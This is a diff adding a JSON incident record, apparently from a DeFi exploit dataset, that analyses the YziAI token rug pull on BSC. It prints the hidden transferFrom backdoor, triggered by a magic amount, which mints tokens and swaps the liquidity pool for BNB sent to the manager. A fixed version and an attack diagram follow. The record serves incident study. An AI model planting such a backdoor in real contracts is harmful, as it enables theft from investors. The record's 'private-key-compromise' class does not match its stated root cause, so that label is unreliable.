@@ -1,0 +1,28 @@
+{
+ "id": "2025__2025-03-25_YziAIToken_Backdoor",
+ "source_file": "2025/2025-03-25_YziAIToken_Backdoor.md",
+ "title": "YziAI Token — transferFrom Backdoor Exploitation Analysis",
+ "date": "2025-03-25",
+ "protocol": "YziAI Token",
+ "chain": "BSC",
+ "loss_raw": "~376 BNB",
+ "loss_usd": null,
+ "root_cause": "Hidden backdoor in transferFrom activated when a special magic number (1199002345) is passed as the amount",
+ "attack_tx": "0x4821392c...",
+ "vulnerable_contract": "0x7fdff64bf87bad52e6430bda30239bd182389ee3",
+ "classes": [
+  "private-key-compromise"
+ ],
+ "code_before": [
+  "❌ transferFrom with hidden malicious backdoor\nfunction transferFrom(\n    address from,\n    address to,\n    uint256 amount\n) public virtual override returns (bool) {\n    //",
+  "❌ Hidden backdoor: bypasses normal behavior when specific conditions are met\n    if (msg.sender == manager && amount == 1199002345) {\n        // Mint massive amount of tokens\n        _mint(address(this), supply * 10000);\n        // Approve router\n        _approve(address(this), router, supply * 100000);\n\n        // Swap all tokens in the LP pool for BNB (rug pull)\n        path.push(address(this));\n        path.push(IUniswapV2Router02(router).WETH());\n        IUniswapV2Router02(router).swapExactTokensForETH(\n            balanceOf(to) * 1000,  // uses tokens at the `to` address\n            1,\n            path,\n            manager,  //",
+  "❌ sends ETH to manager\n            block.timestamp + 1e10\n        );\n        return true;\n    }\n    // Normal transferFrom logic...\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct standard transferFrom — no backdoor\nfunction transferFrom(address from, address to, uint256 amount)\n    public virtual override returns (bool) {\n    _spendAllowance(from, msg.sender, amount);\n    _transfer(from, to, amount);\n    return true;\n}"
+ ],
+ "steps": [],
+ "other_code": [
+  "manager (deployer/attacker)\n  │\n  ├─[1]─► Deploy YziAI token (backdoor code hidden inside)\n  │\n  ├─[2]─► Regular investors buy tokens (liquidity accumulates in LP pool)\n  │\n  ├─[3]─► manager calls transferFrom(CAKE_LP, CAKE_LP, 1199002345)\n  │         └─► backdoor activated by magic number\n  │\n  ├─[4]─► Inside the backdoor:\n  │         ├─► mint supply * 10000 tokens\n  │         ├─► approve router\n  │         └─► swap all LP pool tokens for BNB\n  │\n  └─[5]─► manager receives ~376 BNB (rug pull complete)"
+ ]
+}
